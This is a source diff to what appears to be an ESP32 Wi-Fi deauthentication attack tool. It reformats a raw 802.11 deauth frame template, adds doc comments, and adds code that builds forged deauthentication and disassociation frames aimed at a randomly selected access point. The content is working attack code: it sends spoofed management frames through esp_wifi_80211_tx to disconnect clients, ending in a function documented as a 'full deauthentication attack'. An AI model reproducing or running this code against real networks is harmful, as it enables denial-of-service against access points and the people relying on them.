@@ -51,38 +51,23 @@ int Deauth::randomIndex;
  */
 
 uint8_t Deauth::deauthTemp[26] = {
-    /*  0 - 1  */ 0xC0,
-    0x00, // Type, subtype: c0 => deauth, a0 => disassociate
-    /*  2 - 3  */ 0x00,
-    0x00, // Duration (handled by the SDK)
-    /*  4 - 9  */ 0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF,
-    0xFF, // Reciever MAC (To)
-    /* 10 - 15 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // Source MAC (From)
-    /* 16 - 21 */ 0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC,
-    0xCC, // BSSID MAC (From)
-    /* 22 - 23 */ 0x00,
-    0x00, // Fragment & squence number
-    /* 24 - 25 */ 0x01,
-    0x00 // Reason code (1 = unspecified reason)
+  /*  0 - 1  */ 0xC0, 0x00, // Type, subtype: c0 => deauth, a0 => disassociate
+  /*  2 - 3  */ 0x00, 0x00, // Duration (handled by the SDK)
+  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Reciever MAC (To)
+  /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // Source MAC (From)
+  /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID MAC (From)
+  /* 22 - 23 */ 0x00, 0x00, // Fragment & squence number
+  /* 24 - 25 */ 0x01, 0x00 // Reason code (1 = unspecified reason)
 };
 
 uint8_t Deauth::deauthFrame[26];
 uint8_t Deauth::disassociateFrame[26];
 uint8_t Deauth::broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
 
+/**
+ * Adds SSIDs (or BSSIDs) to the whitelist
+ * @param bssids SSIDs/BSSIDs to whitelist
+ */
 void Deauth::add(const std::string &bssids) {
   std::stringstream ss(bssids);
   std::string token;
@@ -109,15 +94,23 @@ void Deauth::list() {
   }
 }
 
+/**
+ * Sends a packet
+ * @param buf Packet to send
+ * @param len Length of packet
+ * @param sys_seq Ignore this, just make it false
+ */
 bool Deauth::send(uint8_t *buf, uint16_t len, bool sys_seq) {
   delay(102);
   esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, buf, len, sys_seq);
   return (err == ESP_OK);
 }
 
-// check if this is a broadcast
-// source:
-// https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
+/**
+ * Check if packet source address is a broadcast
+ * source: https://github.com/SpacehuhnTech/esp8266_deauther/blob/v2/esp8266_deauther/functions.h#L334
+ * @param mac Mac address to check
+ */
 bool Deauth::broadcast(uint8_t *mac) {
   for (uint8_t i = 0; i < 6; i++) {
     if (mac[i] != broadcastAddr[i])
@@ -127,12 +120,20 @@ bool Deauth::broadcast(uint8_t *mac) {
   return true;
 }
 
+/**
+ * Format Mac Address as a String, then print it
+ * @param mac Address to print
+ */
 void Deauth::printMac(uint8_t *mac) {
   String macStr = printMacStr(mac);
   Serial.println(macStr);
   Display::updateDisplay("('-')", "AP BSSID: " + macStr);
 }
 
+/**
+ * Function meant to print Mac as a String used in printMac()
+ * @param mac Mac to use
+ */
 String Deauth::printMacStr(uint8_t *mac) {
   char buf[18]; // 17 for MAC, 1 for null terminator
   snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1],
@@ -140,6 +141,9 @@ String Deauth::printMacStr(uint8_t *mac) {
   return String(buf);
 }
 
+/**
+ * Selects an AP to deauth, returns a boolean based on if the scan and selection was successful
+ */
 bool Deauth::select() {
   // reset values
   Deauth::randomAP = "";
@@ -268,6 +272,41 @@ bool Deauth::select() {
     std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
     std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);
 
+    // checks if this is a broadcast
+    if (!broadcast(Deauth::broadcastAddr)) {
+      // build deauth
+      Deauth::deauthFrame[0] = 0xC0; // type
+      Deauth::deauthFrame[1] = 0x00; // subtype
+      Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
+      Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
+
+      // reason
+      Deauth::deauthFrame[24] = 0x01; // reason: unspecified
+
+      std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
+      std::copy(Deauth::broadcastAddr,
+                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+                Deauth::deauthFrame + 10);
+      std::copy(Deauth::broadcastAddr,
+                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+                Deauth::deauthFrame + 16);
+
+      // build disassocaition
+      Deauth::disassociateFrame[0] = 0xA0; // type
+      Deauth::disassociateFrame[1] = 0x00; // subtype
+      Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
+      Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
+
+      std::copy(apBssid, apBssid + sizeof(apBssid),
+                Deauth::disassociateFrame + 4);
+      std::copy(Deauth::broadcastAddr,
+                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+                Deauth::disassociateFrame + 10);
+      std::copy(Deauth::broadcastAddr,
+                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+                Deauth::disassociateFrame + 16);
+    }
+
     Serial.print("('-') Full AP SSID: ");
     Serial.println(WiFi.SSID(Deauth::randomIndex));
     Display::updateDisplay("('-')",
@@ -320,6 +359,9 @@ bool Deauth::select() {
   return false;
 }
 
+/**
+ * Full deauthentication attack
+ */
 void Deauth::deauth() {
   if (Config::deauth) {
     // select AP
